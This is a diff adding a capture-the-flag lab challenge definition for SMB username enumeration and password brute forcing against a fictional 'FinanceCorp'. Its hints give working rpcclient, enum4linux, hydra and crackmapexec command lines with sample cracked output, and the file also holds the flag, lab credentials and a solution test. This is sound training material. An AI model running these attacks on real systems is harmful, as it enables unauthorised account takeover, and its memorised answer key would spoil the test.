@@ -1,0 +1,251 @@
+name: SMB Username Enumeration and Brute Force
+description: Combine username enumeration with brute force attacks to test FinanceCorp's authentication security comprehensively.
+difficulty: intermediate
+category: credential-attacks
+duration_minutes: 120
+objectives:
+  - enumerate username then brute force password
+  - Understand Windows penetration testing techniques
+  - Capture the flag
+
+scenario: |
+  Your assessment of FinanceCorp's SMB authentication has revealed both enumeration 
+  opportunities and credential testing vectors. James Mitchell wants a comprehensive 
+  demonstration of how username enumeration combined with brute force attacks could 
+  compromise their systems.
+  
+  The combination of username enumeration and brute forcing represents a complete 
+  credential attack chain. FinanceCorp needs to understand how these techniques work 
+  together to assess their authentication security.
+  
+  Your objective: Enumerate valid usernames on FinanceCorp's system, then perform 
+  automated brute force attacks against discovered accounts. Document the complete 
+  attack chain and demonstrate the security impact.
+
+flag: "OCR{smb_3num_brut3}"
+
+hints:
+  - text: |
+      **Combined enumeration and brute force** represents a complete SMB attack chain. This two-phase approach first discovers valid usernames, then tests passwords against those accounts.
+
+      **Attack chain phases:**
+      1. **Phase 1 - Enumeration**: Discover valid usernames
+      2. **Phase 2 - Brute force**: Test passwords against enumerated users
+
+      **Why this combination is powerful:**
+      - **Valid targets**: No wasted attempts on non-existent users
+      - **Efficiency**: Focus efforts on real accounts
+      - **Higher success rate**: Both username and password are tested
+      - **Real-world scenario**: Mimics actual attacker workflow
+      - **Comprehensive assessment**: Tests both enum and auth security
+
+      This demonstrates the full credential attack lifecycle.
+    unlock_after_minutes: 0
+
+  - text: |
+      **Phase 1: Username enumeration** provides valid targets for brute forcing:
+
+      **Enumeration methods review:**
+      - **Null session RPC**: `rpcclient -U "" -N target`
+      - **enum4linux**: `enum4linux -U target`
+      - **SMB user enum**: Various NSE scripts
+
+      **What to extract:**
+      - Valid usernames from enumdomusers
+      - User RIDs (500 = Administrator)
+      - Account descriptions
+      - Account status
+
+      **Creating username list:**
+      ```bash
+      # Using rpcclient
+      rpcclient -U "" -N target -c 'enumdomusers' | cut -d '[' -f 2 | cut -d ']' -f 1 > users.txt
+
+      # Using enum4linux
+      enum4linux -U target | grep "user:" | cut -d '[' -f 2 | cut -d ']' -f 1 > users.txt
+      ```
+
+      Having a valid username list dramatically improves brute force success rates.
+    unlock_after_minutes: 5
+
+  - text: |
+      **Phase 2: Password brute force** tests discovered usernames:
+
+      **Brute force strategies:**
+
+      **Strategy 1: Password spraying (recommended)**
+      - Test one password against all enumerated users
+      - Avoids account lockout
+      - Example: Test "Password123" against 50 users
+
+      **Strategy 2: Targeted brute force**
+      - Focus on high-value accounts (Administrator, admin)
+      - Use smaller, targeted wordlists
+      - Monitor for lockout
+
+      **Strategy 3: Credential stuffing**
+      - Test username=password combinations first
+      - Often successful on lazy configurations
+      - Quick initial check
+
+      **Workflow:**
+      1. Save enumerated usernames to file
+      2. Create or select password wordlist
+      3. Configure hydra/crackmapexec
+      4. Launch password spray
+      5. Document successful credentials
+      6. Test authenticated access
+
+      Password spraying is safest as it distributes attempts across many accounts.
+    unlock_after_minutes: 10
+
+  - text: |
+      **Hydra with enumerated usernames:**
+
+      ```bash
+      # Single password against multiple users (password spray)
+      hydra -L users.txt -p Password123 smb://target
+
+      # Multiple passwords against multiple users
+      hydra -L users.txt -P passwords.txt smb://target
+
+      # Username = password testing
+      hydra -L users.txt -e nsr smb://target
+      ```
+
+      **Hydra flags explained:**
+      - `-L users.txt`: Username list (enumerated)
+      - `-P passwords.txt`: Password wordlist
+      - `-e nsr`: Additional tests
+        - `n`: null password
+        - `s`: username as password
+        - `r`: reversed username as password
+
+      **Crackmapexec with enumeration:**
+      ```bash
+      # Enumerate users first
+      crackmapexec smb target -u '' -p '' --users > users.txt
+
+      # Extract usernames (manual or script)
+      # Then brute force
+      crackmapexec smb target -u users.txt -p passwords.txt
+      ```
+
+      **Password spraying with crackmapexec:**
+      ```bash
+      crackmapexec smb target -u users.txt -p 'Password123' --continue-on-success
+      ```
+
+      The `--continue-on-success` flag tests all users even after finding valid credentials.
+    unlock_after_minutes: 15
+
+  - text: |
+      To perform combined enumeration and brute force on FinanceCorp:
+
+      **Step 1: Enumerate usernames**
+      ```bash
+      rpcclient -U "" -N <target> -c 'enumdomusers' | grep -oP 'user:\[\K[^\]]+' > users.txt
+      ```
+
+      Or using enum4linux:
+      ```bash
+      enum4linux -U <target> | grep "user:" | cut -d '[' -f 2 | cut -d ']' -f 1 > users.txt
+      ```
+
+      **Step 2: Create password list**
+      ```bash
+      cat > passwords.txt <<EOF
+      password
+      Password123
+      admin
+      Admin123
+      Finance2024
+      EOF
+      ```
+
+      **Step 3: Password spray**
+      ```bash
+      hydra -L users.txt -P passwords.txt smb://<target> -t 2
+      ```
+
+      **Alternative: Test username=password first**
+      ```bash
+      hydra -L users.txt -e nsr smb://<target>
+      ```
+
+      **Using crackmapexec:**
+      ```bash
+      crackmapexec smb <target> -u users.txt -p passwords.txt
+      ```
+
+      This complete workflow demonstrates the full attack chain from enumeration to authentication.
+    unlock_after_minutes: 20
+
+  - text: |
+      Combined enumeration and brute force output:
+
+      **Phase 1: Enumeration**
+      ```bash
+      $ rpcclient -U "" -N <target_ip> -c 'enumdomusers'
+      user:[Administrator] rid:[0x1f4]
+      user:[Guest] rid:[0x1f5]
+      user:[admin] rid:[0x3e8]
+      user:[backup] rid:[0x3e9]
+
+      $ rpcclient -U "" -N <target_ip> -c 'enumdomusers' | grep -oP 'user:\[\K[^\]]+' > users.txt
+
+      $ cat users.txt
+      Administrator
+      Guest
+      admin
+      backup
+      ```
+
+      **Phase 2: Brute force**
+      ```bash
+      $ hydra -L users.txt -P passwords.txt smb://<target_ip>
+      Hydra v9.5 starting...
+      [DATA] attacking smb://<target_ip>:445/
+      [445][smb] host: <target_ip>   login: admin   password: admin
+      [445][smb] host: <target_ip>   login: backup   password: Password123
+      [STATUS] attack finished
+      2 of 1 target successfully completed, 2 valid passwords found
+      ```
+
+      **What to document:**
+      1. Number of enumerated users
+      2. Enumeration method used
+      3. Valid credentials discovered
+      4. Success rate (credentials found / users tested)
+      5. Time taken for complete attack chain
+
+      **Next steps:**
+      - Verify credentials: `smbclient -L //<target> -U admin%admin`
+      - Access shares with valid credentials
+      - Enumerate files and directories
+      - Document privilege levels
+      - Test for lateral movement opportunities
+
+      The flag is accessible after successfully completing both enumeration and brute force phases. Enumerate users first, then brute force passwords against the discovered accounts.
+    unlock_after_minutes: 25
+workbook: "wiki/range/winpt/CH03_SMB_Credential_Attacks/04_Username_Enumeration_and_Brute_Force/"
+
+credentials:
+  - username: "user1"
+    password: "password123"
+    role: "smb-user"
+    description: "SMB authenticated user"
+
+test:
+  steps:
+    - name: "Verify SMB port 445 is open"
+      command: "nmap -Pn -p 445 {target.target} | grep '445/tcp'"
+      expect: "open"
+
+    - name: "Authenticate to SMB with enumerated credentials"
+      command: "smbclient //{target.target}/private -U '{cred.smb-user.user}%{cred.smb-user.pass}' -c 'ls' 2>&1"
+      expect: "flag.txt"
+
+    - name: "Retrieve flag from SMB private share"
+      command: "smbclient //{target.target}/private -U '{cred.smb-user.user}%{cred.smb-user.pass}' -c 'get flag.txt -' 2>/dev/null"
+      expect: "OCR{"
